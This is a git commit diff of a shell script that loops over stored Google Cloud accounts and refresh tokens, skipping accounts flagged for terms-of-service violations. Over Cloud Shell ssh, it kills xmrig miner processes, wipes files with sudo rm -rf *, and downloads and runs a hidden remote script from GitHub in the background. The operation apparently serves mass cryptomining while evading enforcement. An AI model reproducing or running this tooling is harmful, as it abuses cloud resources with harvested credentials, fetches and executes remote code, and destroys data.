99919924422dabd7510085986f364fe25fd75e3c
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-09-11 22:01:40 -0300

    Update limpar.sh

--- limpar.sh
+++ limpar.sh
@@ -6,10 +6,10 @@ do
 echo
 echo $account
 
-command="echo 'ok' ; sudo pkill xmrig ; sudo pkill ping.sh ; sudo rm -rf * ; sudo rm -rf .customize_environment ; wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null &"
+command="echo 'ok' ; sudo pkill payload.sh ; sudo pkill xmrig ; sudo pkill ping.sh ; sudo pkill status.sh ;  sudo rm -rf * ; sudo rm -rf .customize_environment ; wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null &"
 
 gcloud cloud-shell ssh --account=$account --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet
 
 sleep 1
 
-done < <(echo "select account , refresh_token from tbl_account" | mysql --login-path=$home/config.cnf fenix -s)
+done < <(echo "select account , refresh_token from tbl_account where status <> 'TOS_VIOLATION' " | mysql --login-path=$home/config.cnf fenix -s)
